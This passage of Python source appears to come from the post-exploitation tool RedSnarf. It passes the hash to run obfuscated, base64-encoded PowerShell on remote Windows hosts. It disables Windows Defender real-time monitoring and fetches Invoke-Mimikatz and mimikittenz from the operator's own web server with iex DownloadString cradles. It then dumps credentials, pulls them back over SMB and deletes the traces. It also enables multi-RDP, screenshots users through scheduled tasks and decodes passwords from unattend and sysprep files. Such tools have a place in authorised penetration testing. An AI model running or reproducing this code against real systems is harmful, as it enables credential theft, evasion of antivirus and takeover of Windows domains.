						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]
						if "DisableRealtimeMonitoring : False" in stdout_value:
							print colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow')
							AVstatus='On'
						else:
							print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
							AVstatus='Off'

					if stealth_mimi=="AV":
						
						#If it is a later Windows version check the UseLogonCredentials reg value to see whether cleartext creds will be available						
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]
						if "UseLogonCredential    REG_DWORD    0x0" in stdout_value:
							print colored("[-]The reg value UseLogonCredential is set to 0 - no cleartext credentials will be available, use the -rW e/d/q parameter to modify this value",'green')
						else:
							print colored("[+]UseLogonCredential Registry Value is set to 1 - cleartext credentials will be hopefully be available",'green')
						
						#If Windows Defender is turned on turn off 
						if AVstatus=='On':
							response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
							if response in yesanswers:	
								print colored("[+]Turning off Temporarily Windows Defender Realtime Monitoring...",'blue')
								line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
								en = b64encode(line.encode('UTF-16LE'))						
								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
						
						#Prepare string
						line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Dwmp > c:\\creds.txt"
					else:
						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Dwmp > c:\\creds.txt"
					
					print colored("[+] Using: "+line,'yellow')
					en = b64encode(line.encode('UTF-16LE'))
					print colored("[+] Encoding command: "+en,'yellow')
					
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\creds.txt\" 2>/dev/null")
					
					if stealth_mimi=="AV":
						#If Windows Defender AV status was on, turn it back on
						if AVstatus=='On':
							if response in yesanswers:	
								print colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue')
								line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
								en = b64encode(line.encode('UTF-16LE'))						
								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")

					if os.path.isfile(outputpath+host+"/creds.txt"):
						print colored("[+]creds.txt file found",'green')
						if not os.path.isfile('/usr/bin/iconv'):
							print colored("[-]Cannot find iconv",'red')
							exit(1)
						else:
							print colored("[+]Found iconv",'green')
							os.system("iconv -f utf-16 -t utf-8 "+outputpath+host+"/creds.txt > "+outputpath+host+"/creds1.txt")
							# one liner from here: http://lifepluslinux.blogspot.com/2014/09/convert-little-endian-utf-16-to-ascii.html
							print colored("[+]Basic parsed output:",'green')
							os.system("cat "+outputpath+host+"/creds1.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
							print colored("[+]Mimikatz output stored in "+outputpath+host+"/creds1.txt",'yellow')
							print colored("[+]Stopping web server",'green')
							server_process.terminate()
					else:
						print colored("[-]creds1.txt file not found",'red')

				except OSError:
					print colored("[-]Something went wrong here...",'red')

			if empire_launcher in yesanswers:
				try:		
					#Check to make sure port is not already in use
					for i in xrange(10):
						PORT = randint(49151,65535)					
						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]
						if len(stdout_value)>0:
							break

					my_ip=get_ip_address('eth0')
					print colored("[+]Attempting to start Empire Launcher",'green')
					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
					httpd = SocketServer.TCPServer(("",PORT), Handler)
					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
					server_process = multiprocessing.Process(target=httpd.serve_forever)
					server_process.daemon = True
					server_process.start()	
					
					x=' '
					
					print colored("\n[+]Empire Powershell Launcher",'green')
					print colored("[+]Do not include powershell.exe -NoP -sta -NonI -W Hidden -Enc\n",'yellow')
					response = raw_input("Please enter the PowerShell String to Execute :- ")
					if response !="":	
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+response+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print colored("[+]Launcher Command Sent...",'yellow')
						
					print colored("[+]Stopping web server",'green')
					server_process.terminate()

				except OSError:
					print colored("[-]Something went wrong here...",'red')

			if multi_rdp in yesanswers or multi_rdp=="AV":
				try:
					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
					if not os.path.isfile('./a'):
						print colored("[-]Cannot find Invoke-Mimikatz.ps1",'red')
						exit(1)
					print colored("[+]Looks good",'green')	
					
					#Check to make sure port is not already in use
					for i in xrange(10):
						PORT = randint(49151,65535)					
						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]
						if len(stdout_value)>0:
							break

					my_ip=get_ip_address('eth0')
					print colored("[+]Attempting to Run Stealth Mimikatz",'green')
					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
					httpd = SocketServer.TCPServer(("",PORT), Handler)
					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
					server_process = multiprocessing.Process(target=httpd.serve_forever)
					server_process.daemon = True
					server_process.start()	
					
					x=' '
					
					if multi_rdp=="AV":
						#Get Windows Defender status and store status
						print colored("[+]Getting Windows Defender Status",'yellow')
						line="Get-MpPreference | fl DisableRealtimeMonitoring"
						en = b64encode(line.encode('UTF-16LE'))						
						
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]
						if "DisableRealtimeMonitoring : False" in stdout_value:
							print colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow')
							AVstatus='On'
						else:
							print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
							AVstatus='Off'

					if multi_rdp=="AV":
						#If Windows Defender is turned on turn off 
						if AVstatus=='On':
							response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
							if response in yesanswers:	
								print colored("[+]Turning off Temporarily Windows Defender Realtime Monitoring...",'blue')
								line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
								en = b64encode(line.encode('UTF-16LE'))						
								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
						
						#Prepare string
						line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Dwmp > c:\\creds.txt"
					else:
						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Command \"ts::multirdp\""
					
					print colored("[+] Using: "+line,'yellow')
					en = b64encode(line.encode('UTF-16LE'))
					print colored("[+] Encoding command: "+en,'yellow')
					
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
										
					if multi_rdp=="AV":
						#If Windows Defender AV status was on, turn it back on
						if AVstatus=='On':
							if response in yesanswers:	
								print colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue')
								line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
								en = b64encode(line.encode('UTF-16LE'))						
								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
										
				except OSError:
					print colored("[-]Something went wrong here...",'red')

			if mimikittenz in yesanswers:
				try:
					print colored("[+]Checking for Invoke-mimikittenz.ps1",'green')
					if not os.path.isfile('./b'):
						print colored("[-]Cannot find Invoke-mimikittenz.ps1",'red')
						exit(1)
					print colored("[+]Looks good",'green')	
					
					#Check to make sure port is not already in use
					for i in xrange(10):
						PORT = randint(49151,65535)					
						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]
						if len(stdout_value)>0:
							break
										
					my_ip=get_ip_address('eth0')
					print colored("[+]Attempting to Run Mimikittenz",'green')
					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
					httpd = SocketServer.TCPServer(("",PORT), Handler)
					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
					server_process = multiprocessing.Process(target=httpd.serve_forever)
					server_process.daemon = True
					server_process.start()	
					
					print colored("[+]Creating powershell script in /tmp/mimikittenz.ps1",'green')
					fout=open('/tmp/mimikittenz.ps1','w')

					line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/b')); cathod > c:\\kittenz_creds.txt"
					fout.write(line)
					fout.close()
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimikittenz.ps1\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimikittenz.ps1 -Verb RunAs\" 2>/dev/null")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get kittenz_creds.txt\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\kittenz_creds.txt c:\\mimikittenz.ps1\" 2>/dev/null")
					if os.path.isfile(outputpath+host+"/kittenz_creds.txt"):
						print colored("[+]kittenz_creds.txt file found",'green')
						if not os.path.isfile('/usr/bin/iconv'):
							print colored("[-]Cannot find iconv",'red')
							exit(1)
						else:
							print colored("[+]Found iconv",'green')
							os.system("iconv -f utf-16 -t utf-8 "+outputpath+host+"/kittenz_creds.txt > "+outputpath+host+"/kittenz_creds1.txt")
							# one liner from here: http://lifepluslinux.blogspot.com/2014/09/convert-little-endian-utf-16-to-ascii.html
							print colored("[+]Basic parsed output:",'green')
							
							if 'PatternName' in open(outputpath+host+"/kittenz_creds1.txt").read():
								print colored("[+]Looks like we have found some creds.....","yellow")
								os.system("cat "+outputpath+host+"/kittenz_creds1.txt")

							print colored("[+]Mimikatz output stored in "+outputpath+host+"/kittenz_creds1.txt",'yellow')
							print colored("[+]Clearing up.....","yellow")
							os.system("rm /tmp/mimikittenz.ps1")
							print colored("[+]Stopping web server",'green')
							server_process.terminate()
					else:
						print colored("[-]kittenz_creds.txt file not found",'red')

				except OSError:
					print colored("[-]Something went wrong here...",'red')

			if screenshot in yesanswers:
				loggeduser1=""
				loggeduser = []
				activeusers=0
				
				try:
					print colored("[+]Attempting to Screenshot Desktop",'green')
					
					res = os.stat(path+host+"/logged_on_users.txt").st_size > 3
			
					if res==True:
						try:
							u = open(path+host+"/logged_on_users.txt").read().splitlines()
																					
							if len(loggeduser)==0:
								for n in u:
									if n:
										if not "USERNAME" in n:
											if "Active" in n:
												loggeduser1=n.lstrip()
												endofloggeduser=loggeduser1.find(" ")
												loggeduser.append(loggeduser1[:endofloggeduser])
												

							if len(loggeduser)==0:
								print colored("[-]No logged on Active Users found: "+host,'red')
								exit(1)	

						except IOError as e:
							print "I/O error({0}): {1}".format(e.errno, e.strerror)
					else:
						print colored("[-]No logged on users found: "+host,'red')
						exit(1)	

										
					for x in xrange(0,len(loggeduser)):
												
						fout=open('/tmp/sshot.bat','w')
						fout.write('SchTasks /Create /SC DAILY /RU '+loggeduser[x]+' /TN "RedSnarf_ScreenShot" /TR "cmd.exe /c start /min c:\\rsc.exe c:\\windows\\temp\\'+loggeduser[x]+"_"+host+'.png" /ST 23:36 /f\n')
						fout.write('SchTasks /run /TN "RedSnarf_ScreenShot" \n')
						fout.close() 
					
						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"; put rsc.exe\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put sshot.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+host+" \"c:\\sshot.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
						print proc.communicate()[0]
						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/temp -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+loggeduser[x]+"_"+host+".png"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
						print proc.communicate()[0]
					
						if os.path.isfile(outputpath+host+"/"+loggeduser[x]+"_"+host+".png"):
							print colored("[+]Screenshot file saved as "+outputpath+host+"/"+loggeduser[x]+"_"+host+".png",'yellow')
						else:
							print colored("[-]Screenshot not found, try again..",'red')

						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\windows\\temp\\"+loggeduser[x]+"_"+host+".png\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
						print proc.communicate()[0]
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\rsc.exe c:\\sshot.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	

						time.sleep(4)

						fout=open('/tmp/sshot_del.bat','w')
						fout.write('SchTasks /delete /TN "RedSnarf_ScreenShot" /f')
						fout.close() 

						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put sshot_del.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
					
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+host+" \"c:\\sshot_del.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print proc.communicate()[0]
					
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\sshot_del.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
					
						time.sleep(4)

				except OSError:
					print colored("[-]Something went wrong running screenshot...",'red')

			if unattend in yesanswers:
				
				try:
					
					#Check for 64 Bit Version Values of VMWare DeployData
					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					deploydata=proc.communicate()[0]
					deploydata=deploydata[108:].rstrip()
					
					deploydata=str(bytearray.fromhex(deploydata))
					
					if "<EncryptedValue>" and  "guestcustutil.exe" in deploydata:
						print colored("\n[+]VMware Specific ",'green')
						print colored("[+]Registry values indicate this machine may have been deployed via a VMware Template",'yellow')
						print colored("[+]Values for <EncryptedValue> and guestcustutil.exe were found in DeployData",'yellow')
						print colored("[+]You may wish to double check the unattend.xml file which can be found in the path indicated below...",'yellow')
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"SysprepFilePath\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print proc.communicate()[0]
					
					#Check for 32 Bit Version Values of VMWare DeployData
					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					deploydata=proc.communicate()[0]
					deploydata=deploydata[108:].rstrip()
					
					deploydata=str(bytearray.fromhex(deploydata))
					
					if "<EncryptedValue>" and  "guestcustutil.exe" in deploydata:
						print colored("\n[+]VMware Specific ",'green')
						print colored("[+]Registry values indicate this machine may have been deployed via a VMware Template",'yellow')
						print colored("[+]Values for <EncryptedValue> and guestcustutil.exe were found in DeployData",'yellow')
						print colored("[+]You may wish to double check the unattend.xml file which can be found in the path indicated below...",'yellow')
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\VMware, Inc.\Guest Customization\" /v \"SysprepFilePath\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print proc.communicate()[0]

					print colored("\n[+]Attempting to Find Unattend/Sysprep Files",'green')
					
					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get sysprep.inf\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory sysprep -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get sysprep.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get unattend.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther/unattend -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)		

					if os.path.isfile(outputpath+host+"/unattend.xml"):
						print colored("[+]" +outputpath+host+"/unattend.xml file found, grepping for username, password, group",'green')
						
						os.chdir(outputpath+host)
												
						os.system("grep --color='auto' -i \"<Password>\" unattend.xml")
						os.system("grep --color='auto' -i \"<Username>\" unattend.xml")
						os.system("grep --color='auto' -i \"<Name>\" unattend.xml")
						os.system("grep --color='auto' -i \"<Group>\" unattend.xml")
						
						os.system("grep --color='auto' -i \"=</Value>\" unattend.xml > unattend_b64values.txt")

						if os.path.isfile(outputpath+host+"/unattend_b64values.txt"):
							print colored("\n[+]Decoding Base64 Encoded Values",'green')
							with open(outputpath+host+"/unattend_b64values.txt") as f:
								content = f.readlines()
							
							for x in content:
								print "B64 Value "+ colored(x.strip()[7:-8],'yellow') + " decodes to " + colored(base64.b64decode(x.strip()[7:-8]),'yellow')

					if os.path.isfile(outputpath+host+"/Unattended.xml"):
						print colored("[+]Unattended.xml file found, grepping for username, password, group",'green')
						
						os.chdir(outputpath+host)
					
						os.system("grep --color='auto' -i \"<Password>\" Unattendedxml")
						os.system("grep --color='auto' -i \"<Username>\" Unattended.xml")
						os.system("grep --color='auto' -i \"<Name>\" Unattended.xml")
						os.system("grep --color='auto' -i \"<Group>\" Unattended.xml")

						os.system("grep --color='auto' -i \"=</Value>\" Unattended.xml > unattended_b64values.txt")

						if os.path.isfile(outputpath+host+"/unattended_b64values.txt"):
							print colored("\n[+]Decoding Base64 Encoded Values",'green')
							with open(outputpath+host+"/unattended_b64values.txt") as f:
								content = f.readlines()
							
							for x in content:
								print "B64 Value "+ colored(x.strip()[7:-8],'yellow') + " decodes to " + colored(base64.b64decode(x.strip()[7:-8]),'yellow')


					if os.path.isfile(outputpath+host+"/sysprep.xml"):
						print colored("[+]sysprep.xml file found, grepping for username, password, group",'green')
						
						os.chdir(outputpath+host)
					
						os.system("grep --color='auto' -i \"<Password>\" sysprep.xml")
						os.system("grep --color='auto' -i \"<Username>\" sysprep.xml")
						os.system("grep --color='auto' -i \"<Name>\" sysprep.xml")
						os.system("grep --color='auto' -i \"<Group>\" sysprep.xml")

						os.system("grep --color='auto' -i \"=</Value>\" sysprep.xml > sysprep_b64values.txt")

						if os.path.isfile(outputpath+host+"/sysprep_b64values.txt"):
							print colored("\n[+]Decoding Base64 Encoded Values",'green')
							with open(outputpath+host+"/sysprep_b64values.txt") as f:
								content = f.readlines()
							
							for x in content:
								print "B64 Value "+ colored(x.strip()[7:-8],'yellow') + " decodes to " + colored(base64.b64decode(x.strip()[7:-8]),'yellow')


					if os.path.isfile(outputpath+host+"/sysprep.inf"):
						print colored("[+]sysprep.xml file found",'green')
						
						os.chdir(outputpath+host)
					
						os.system("grep --color='auto' -i AdminPassword sysprep.inf")
				

				except OSError:
					print colored("[-]Something went wrong running looking for files...",'red')


def signal_handler(signal, frame):
		print colored("\nCtrl+C pressed.. aborting...",'red')
		logging.error("Ctrl+C pressed.. aborting...")
		sys.exit()

def syschecks():
	winexe = os.system("which pth-winexe > /dev/null")
	if winexe != 0:
		print colored("[-]pth-winexe not installed",'red')
		logging.error("[-]pth-winexe not installed")
		exit(1)
	else:
		print colored("[+]pth-winexe installed",'green')
		logging.info("[+]pth-winexe installed")
	smb = os.system("which /usr/bin/pth-smbclient > /dev/null")
	if smb != 0:
		print colored("[-]/usr/bin/pth-smbclient not installed",'red')
		logging.error("[-]/usr/bin/pth-smbclient not installed")
		exit(1)
	else:
		print colored("[+]pth-smbclient installed",'green')
		logging.info("[+]pth-smbclient installed")
	c = os.path.isdir(creddump7path)
	if not c:
		print colored("[-]creddump7 not installed in "+creddump7path,'red')
		print colored("[-]Clone from https://github.com/Neohapsis/creddump7",'yellow')
		print colored("[-]going to try and clone it now for you....., you're welcome",'yellow')
		logging.warning("[-]going to try and clone it now for you....., you're welcome")
		os.system("git clone https://github.com/Neohapsis/creddump7 /opt/creddump7")
		exit(1)
	else:
		print colored("[+]creddump7 found",'green')
		logging.info("[+]creddump7 found")
def checkport():
	host=targets[0]
	scanv = subprocess.Popen(["nmap", "-sS", "-p88","--open", str(host)], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
	oscheck = scanv.split()
	if not "open" in scanv:
		print colored("[-]Port 88 Closed - Are you sure this is a Domain Controller?\n",'red')
		logging.error("[-]Port 88 Closed - Are you sure this is a Domain Controller?")
		exit(1)
	else:
		print colored("[+]Looks like a Domain Controller",'green')

def get_local_admins(ip,username,password,domain):
	
	LocalAdmin=False
	
	if username=="":
		print colored("[-]Username is missing..",'red')
		exit(1)
	else:
		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain+"\\"+username+"%"+password+"\" --uninstall --system \/\/"+ip+" 'net localgroup administrators' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
		stdout_value = proc.communicate()[0]
		if username.upper() in stdout_value.upper():
			LocalAdmin = True
		
	return LocalAdmin	


def get_domain_admins(ip,username,password,domain):
	
	DomainAdmin=False

	if username=="":
		print colored("[-]Username is missing..",'red')
		logging.error("[-]Username is missing..")
		exit(1)
	else:
		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain+"\\"+username+"%"+password+"\" --uninstall --system \/\/"+ip+" 'net group \"Domain Admins\" /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
		stdout_value = proc.communicate()[0]
		
		if username.upper() in stdout_value.upper():
			DomainAdmin = True
		
	return DomainAdmin	


def run():
	user=args.username.strip()
	passw=args.password.strip()
	
	for target in targets:

		host=str(target)
		
		passwd=''

		if passw[len(passw)-3:] ==':::':
			lmhash, nthash ,s1,s2,s3 = passw.split(':')
			passwd=lmhash+":"+nthash
		else:
			lmhash = ''
			nthash = ''

		if nthash=='':
			passwd=passw	

		now = time.strftime("%c")
		## date and time representation
		
		print 'User: '+user
		logging.info("[+]Using the following username: "+user)
		print 'Password: '+passw
		print 'Domain Name: '+domain_name
		print colored("[+]Scan Start " + time.strftime("%c"),'blue')
		try: 

			smbClient = SMBConnection(host, host, sess_port=int('445'),timeout=10) 

			x=smbClient.login(user, passwd, domain_name, lmhash, nthash)
					
			if x==None or x==True:
								
				if smbClient.getServerOS().find('Windows')!=-1 and smbClient.isGuestSession()==0:
					print colored("[+]"+host+" Creds OK, User Session Granted",'green')
					logging.info("[+]"+host+" Creds OK, User Session Granted")
					#Check if account is a local admin
					if get_local_admins(host,user,passwd,domain_name):
						print colored("[+]"+host+" Account is a Local Admin",'green')
						logging.info("[+]"+host+" Account is a Local Admin")
					else:
						print colored("[-]"+host+" Account not found in Local Admin Group",'yellow')
						logging.warning("[-]"+host+" Account not found in Local Admin Group")
						
					#Check if account is a Domain Admin
					if get_domain_admins(host,user,passwd,domain_name):
						print colored("[+]"+host+" Account is a Domain Admin",'green') + colored(" Game Over!",'red')
						logging.warning("[+]"+host+" Account is a Domain Admin")
					else:
						print colored("[-]"+host+" Account not found in Domain Admin Group",'yellow')
						logging.warning("[-]"+host+" Account not found in Domain Admin Group")

					if args.quick_validate in noanswers:
						#Display Shares					
						print colored("[+]"+host+" Enumerating Remote Shares",'green')
						print colored("[+]"+host+" Shares Found",'yellow')
						resp = smbClient.listShares()
						for i in range(len(resp)):                        
							print resp[i]['shi1_netname'][:-1]

						t = Thread(target=datadump, args=(user,passw,host,outputpath,smbClient.getServerOS()))
						t.start()
						t.join()
				elif smbClient.getServerOS().find('Windows')==-1:
					print colored("[-]"+host+" MS Windows not detected...",'red')
				elif smbClient.isGuestSession() ==1:
					print colored("[-]"+host+" Guest Session detected...",'red')
				else:
					print colored("[-]"+host+" Something went wrong... ",'red')

		except Exception, e:
			#Catch the login error and display exception
			
			if "STATUS_PASSWORD_EXPIRED" in str(e):
				print colored(e,'yellow')+colored(" - Could be worth a closer look...",'red')
				if remotetargets[0:3]=='ip=':
					response = raw_input("[+]Do you want to try and connect with rdesktop to set a new password? Y/N (N): ")
					if response in yesanswers:
						os.system("rdesktop "+host+" 2>/dev/null")
			else:
				print colored(e,'red')
				logging.exception(e)

def hashparse(hashfolder,hashfile):
#Split hashes into NT and LM	
	file2parse=hashfolder+hashfile

	lst_nthash=[]
	lst_ntuser=[]

	lst_lmhash=[]
	lst_lmuser=[]

	if file2parse!='':
		print colored('\n[+]Parsing hashes...','yellow') 
		if os.path.isfile(file2parse):
			with open(file2parse,'r') as inifile:
				data=inifile.read()
				hash_list=data.splitlines()
				
				#If we're parsing the drsuapi file it also includes the local hashes which we need to filter out
				#Domain hashes start after the line below
